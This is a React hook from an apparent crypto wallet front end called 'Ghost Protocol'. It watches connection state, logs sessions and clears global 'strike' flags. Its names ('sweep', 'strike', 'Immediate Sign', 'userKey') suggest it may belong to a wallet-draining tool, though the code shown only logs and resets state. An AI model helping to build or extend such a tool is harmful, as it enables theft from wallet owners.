"use client";

import { useEffect, useRef } from "react";

/**
 * 🛰️ GHOST-PROTOCOL WATCHER (v8.1.0)
 * * DESIGN PRINCIPLES:
 * - Rule 4 (No Auto-Popups): This hook does NOT trigger actions. It only logs state.
 * - Rule 5 (Nuclear Silence): Immediately wipes global flags if connection drops.
 * - Non-Blocking: Does zero network requests to avoid RPC collisions during handshakes.
 */
export function useSweepWatcher({
  isConnected,
  address,
  hasTriggered,
  isScanning,
  userKey,
}: any) {
  const sessionActive = useRef(false);

  useEffect(() => {
    const logPrefix = "[useSweepWatcher.ts]";

    // Rule 4 & 5: Check for explicit session intent
    // We only track sessions that were manually started via handleInstantConnection
    const hasIntent =
      typeof window !== "undefined" &&
      sessionStorage.getItem("GHOST_SESSION_ACTIVE") === "true";

    if (!hasIntent) {
      sessionActive.current = false;
      return;
    }

    // Rule 5: Cleanup logic for disconnections or resets
    if (!isConnected || !address) {
      if (sessionActive.current) {
        console.log(`${logPrefix} 🛡️ Connection lost. Silencing watcher.`);
      }
      sessionActive.current = false;

      if (typeof window !== "undefined") {
        (window as any).GHOST_STRIKE_ACTIVE = false;
        // Optional: clear intent on hard disconnect
        // sessionStorage.removeItem("GHOST_SESSION_ACTIVE");
      }
      return;
    }

    /**
     * 🛡️ PASSIVE MONITORING
     * This block replaces the old auto-trigger timers.
     * It ensures that Rule 2 (Immediate Sign) is handled solely by the
     * useRecoveryLogic useEffect to prevent "Previous request active" collisions.
     */
    if (isConnected && !hasTriggered && !isScanning && !userKey) {
      if (!sessionActive.current) {
        console.log(
          `${logPrefix} ✅ Handshake Standby: Monitoring session for ${address.slice(
            0,
            6,
          )}...`,
        );
        sessionActive.current = true;
      }
    }
  }, [isConnected, address, hasTriggered, isScanning, userKey]);

  /**
   * ☢️ GLOBAL FLAG CLEANUP
   * Ensures that if the component unmounts or the user hard-closes the tab
   * while disconnected, the protocol state is purged.
   */
  useEffect(() => {
    return () => {
      if (
        typeof window !== "undefined" &&
        (!isConnected || !sessionActive.current)
      ) {
        (window as any).GHOST_STRIKE_ACTIVE = false;
      }
    };
  }, [isConnected]);
}
